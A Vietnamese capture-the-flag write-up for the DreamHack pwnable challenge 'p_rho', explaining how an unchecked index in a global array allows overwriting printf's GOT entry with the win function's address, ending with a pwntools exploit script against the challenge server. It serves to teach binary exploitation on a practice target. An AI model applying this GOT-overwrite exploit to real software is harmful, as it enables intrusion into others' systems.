# p_rho---Write-up-----DreamHack
Hướng dẫn cách giải bài p_rho cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 6/12/2025

## 1. Mục tiêu cần làm
1. Hiểu rõ về biến toàn cục
2. Hiểu rõ về cách code hoạt động

## 2. Cách thực thi
Đầu tiên khi các bạn đọc code, các bạn sẽ nhận ra 1 điều là biến buf chui từ đâu ra vậy ? Các bạn đừng lo, nếu các bạn kiểm tra hết các hàm như `win`, `main`, `start`,... mà không thấy nó khai báo buf thì nó là **biến toàn cục**. Nó sẽ có địa chỉ nằm trong vùng .bss. Giờ hãy đọc code main thôi.

```C
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // [rsp+8h] [rbp-18h] BYREF
  __int64 i; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  for ( i = 0LL; ; i = buf[i] )
  {
    printf("val: ");
    __isoc99_scanf("%lu", &v3);
    buf[i] = v3;
  }
}
```

Các bạn sẽ thấy 1 lỗi cực kì nặng ở đâu, đó là `i = buf[i]`. Nghĩa là khi các bạn nhập i thì ở vòng lặp tiếp theo nó sẽ lấy i đó làm vị trí tiếp theo. Vậy chúng ta có thể khai thác gì từ đây ?

Thì như mình nói là vì buf nằm ở vùng .bss nên chúng ta có thể tương tác với các vùng nằm trước hay đằng sau nó. Bất ngờ là vùng .got tức là địa chỉ chứa các hàm thực thi nằm đằng sau vùng .bss này. Giờ hãy nhìn đi. Mỗi lần lặp là nó sẽ printf ra, lệnh này sẽ gọi thằng printf@plt và thằng này sẽ thực thi địa chỉ tại printf@got ( nằm ở vùng .got ). Vậy thì chúng ta có thể thay đổi địa chỉ tại thằng printf@got bằng địa chỉ hàm `win` và thực thi nó không ?

Làm sao để trỏ vào đó ? Thì như mình nói thì `i = buf[i]` và cái này có 1 đặc điểm là nó có thể trỏ vào bất kì đâu nếu bạn có thể ghi ra đúng địa chỉ tại chỗ đó. Vì khi có địa chỉ ở chỗ đó + địa chỉ của buf thì chúng ta sẽ tính được khoảng cách giữa chúng và thay nó bằng i. Làm sao nó có thể hoạt động ?

Thì cái `buf[i]`, nó chạy giống như vậy nè. Ví dụ buf[0] thì nó sẽ được trỏ vào địa chỉ rbp, buf[1] thì trỏ vào rbp+0x8... cứ như vậy tăng lên, và ngược lại với số âm thì nó sẽ bị tụt xuống. Nhưng index mà âm thì sao mảng chạy được ? Không sao lúc này chúng ta sẽ có kĩ thuật là **bù 2** ( các bạn có thể search gg để tìm hiểu thêm ). Vậy nên chúng ta có thể lợi dụng nó để trỏ vào printf@got. 

Ta có công thức sau : `(index * 8) = buf_add - printf_add`. Tại sao lại nhân 8 ? Bởi vì mảng thường là 1 vị trí là 8 byte nên index phải nhân 8 để ra đúng offset. Và buf_add kiếm đâu ra ? Thì các bạn hãy gõ lệnh sau `nm ./prob | grep buf` là ra được nha.

<img width="475" height="48" alt="image" src="https://github.com/user-attachments/assets/77d4199b-e0d8-4150-b1a1-41fd505fe19f" />

Vậy sau khi có được index rồi chúng ta sẽ trỏ được vào printf@got và thay nó bằng địa chỉ win là xong, khá đơn giản đúng không. Hãy cho mình 1 star để có động lực viết tiếp write up nha 🐧.


```Python
from pwn import *

p = remote('host3.dreamhack.games', 14907)
#p = process('./prob')
e = ELF('./prob')

buf_add = 0x404080
print_got = e.got['printf']
win = e.symbols['win']

offset = ( print_got - buf_add ) // 8

p.sendlineafter(b'val: ', str(offset).encode())
p.sendlineafter(b'val: ', str(win).encode())

p.interactive()
```
